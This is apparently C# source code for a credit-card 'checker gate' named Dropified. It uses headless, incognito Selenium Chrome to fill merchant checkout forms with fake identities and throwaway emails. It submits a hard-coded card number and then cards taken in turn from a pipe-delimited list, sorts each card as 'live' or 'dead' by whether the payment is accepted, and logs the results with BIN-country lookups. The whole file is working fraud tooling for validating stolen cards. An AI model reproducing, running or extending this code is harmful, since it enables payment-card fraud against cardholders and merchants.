using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Dropified
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {




            var lines = Form1.listCC.Lines.Count();
            if (lines > 0)
            {

                Form1.circularProgressBar1.Value = 5;
                var chromeOptions = new ChromeOptions();
                correo = "joseffernanad" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--headless");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://www.josbank.com/TMWINTransferCart?langId=-1&storeId=13452&catalogId=14052&orderId=116444782&URL=OrderShippingBillingView&orderInvLevel=HIGH";

                Thread.Sleep(2000);

                if (tiempoElemento(By.Id("envoyId")))
                {
                    Form1.circularProgressBar1.Value = 30;
                    driver.SwitchTo().Frame("envoyId");
                    Thread.Sleep(2000);
                    driver.FindElement(By.Id("shipping-email")).SendKeys(correo);
                    driver.FindElement(By.Id("shipping-first-name")).SendKeys("GABRIEL");
                    driver.FindElement(By.Id("shipping-last-name")).SendKeys("TORRES");
                    driver.FindElement(By.Id("shipping-address-line1")).SendKeys("STREET 76");
                    driver.FindElement(By.Id("shipping-postal-code")).SendKeys("0000");
                    driver.FindElement(By.Id("shipping-city")).SendKeys("AMBATO");
                    driver.FindElement(By.Id("shipping-tel")).SendKeys("0996521478");
                    Thread.Sleep(3000);
                    driver.FindElement(By.Id("continue-btn-left")).Click();
                    Thread.Sleep(3000);

                    //driver.SwitchTo().ParentFrame();
                    Thread.Sleep(2000);
                }
                else
                {
                    restart();
                }

                if (tiempoElemento(By.Id("cc-frame")))
                {
                    Form1.circularProgressBar1.Value = 50;
                    driver.SwitchTo().Frame("cc-frame");
                    Thread.Sleep(2000);
                    driver.FindElement(By.Id("cc-num")).Clear();
                    Thread.Sleep(2000);
                    driver.FindElement(By.Id("cc-num")).SendKeys("4557880813382664");
                    driver.FindElement(By.Id("cc-exp-date")).Clear();
                    Thread.Sleep(2000);
                    driver.ExecuteJavaScript("document.querySelector('#cc-exp-date').value='0822'");
                    driver.FindElement(By.XPath("//*[@id='cc-exp-date']")).Click();
                    driver.FindElement(By.Id("cc-sec-num")).Clear();
                    Thread.Sleep(2000);
                    driver.FindElement(By.Id("cc-sec-num")).SendKeys("000");
                    Thread.Sleep(2000);
                    driver.SwitchTo().ParentFrame();
                    Thread.Sleep(2000);
                    driver.FindElement(By.Id("submit-order-btn-left")).Click();
                    Thread.Sleep(2000);

                    if (IsElementPresent(By.XPath("//*[@id='envoyApp']/body/div[2]/div/div/div/div[2]/div/div")))
                    {
                        Thread.Sleep(2000);
                    }


                    if (IsElementPresent(By.XPath("//*[@id='messaging']/div/div/div/div/div/table/tbody/tr[1]/td[2]/span")))
                    {
                        Thread.Sleep(2000);//dead
                        driver.FindElement(By.Id("cc-num")).Clear();
                        driver.FindElement(By.Id("cc-exp-date")).Clear();
                        driver.FindElement(By.Id("cc-sec-num")).Clear();
                        Thread.Sleep(2000);
                    }
                    else
                    {
                        Thread.Sleep(2000);
                    }

                }
                else
                {
                    Thread.Sleep(2000);
                }




                //PRUEBA DE PAGO

                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@hotmail.com";

                if (tiempoElemento(By.Name("name")))
                {
                    driver.FindElement(By.Name("name")).SendKeys("JOSE REYES");
                    Thread.Sleep(200);
                    driver.FindElement(By.Name("email")).SendKeys(correo);
                    Thread.Sleep(200);
                    driver.FindElement(By.Name("address")).SendKeys("STREET 366");
                    Thread.Sleep(200);
                    driver.FindElement(By.Name("city")).SendKeys("NEW YORK");
                    Thread.Sleep(200);
                    driver.FindElement(By.Name("state")).SendKeys("NEW YORK");
                    Thread.Sleep(200);
                    driver.FindElement(By.Name("zip")).SendKeys("10001");
                    Thread.Sleep(500);
                    var country = new SelectElement(driver.FindElement(By.Name("country")));
                    country.SelectByValue("US");
                    Thread.Sleep(500);
                   

                    pago();
                }
                else
                {
                    restart();
                }
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                 pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {

                
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {

                driver.FindElement(By.Name("phone")).SendKeys(" " + Keys.Tab);
                Thread.Sleep(500);

                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 10)
                    {
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];
                        var inputcc = driver.SwitchTo().ActiveElement();
                        for (var i = 0; i <= ccnum.Length - 1; i++)
                        {
                            if (i == 0)
                            {
                            Thread.Sleep(500);
                            inputcc.SendKeys(ccnum[i].ToString());
                            }
                            inputcc.SendKeys(ccnum[i].ToString());
                           
                            Thread.Sleep(300);
                        }

                        inputcc.SendKeys(Keys.Tab);

                        var inputccdate = driver.SwitchTo().ActiveElement();

                        Thread.Sleep(200);

                        driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='card-exp-element']/div/iframe")));

                        Thread.Sleep(500);

                        var mes = ccLine[1] +" " + ccLine[2].Remove(0, 2);

                        driver.ExecuteJavaScript("document.querySelector('#root > form > span:nth-child(4) > span > input').value='" +mes+"'");


                        Thread.Sleep(500);

                        driver.SwitchTo().ParentFrame();

                        Thread.Sleep(500);

                        driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='card-cvc-element']/div/iframe")));
                        Thread.Sleep(300);


                        if (ccLine[3].Trim().Length == 3)
                        {
                            
                            Thread.Sleep(200);
                            driver.FindElement(By.XPath("//*[@id='root']/form/span[2]/span/input")).SendKeys("000");

                        }
                        else if (ccLine[3].Trim().Length == 4)
                        {
                           
                            Thread.Sleep(200);
                            driver.FindElement(By.XPath("//*[@id='root']/form/span[2]/span/input")).SendKeys("0000");

                        }
                        Thread.Sleep(200);

                        driver.FindElement(By.XPath("//*[@id='root']/form/span[2]/span/input")).Click();

                        Thread.Sleep(500);

                        

                        driver.SwitchTo().ParentFrame();
                     
                        Thread.Sleep(200);

                        driver.FindElement(By.XPath("/html/body/div[1]/div[10]/div/div[1]/div[1]/div/div[14]/a/span[1]")).Click();

                        Thread.Sleep(500);

                        if (confirmar())
                        {
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6))+" "+Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc);
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Thread.Sleep(300);
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6))+" "+Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                restart();
            }

        }

         public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.XPath("//*[@id='order-declined-message']")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='order-declined-message']")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='order-declined-message']")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }

                    }

                    if (IsElementPresent(By.XPath("/html/body/div[1]/div[8]/div/div/div/div/div[1]/div/b")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[1]/div[8]/div/div/div/div/div[1]/div/b")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[1]/div[8]/div/div/div/div/div[1]/div/b")).Text.Trim() == "Congratulations and welcome to your Free Trial of the Builder Monthly Plan")
                            {
                                estado = "live";
                            }
                        }
                    }

                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

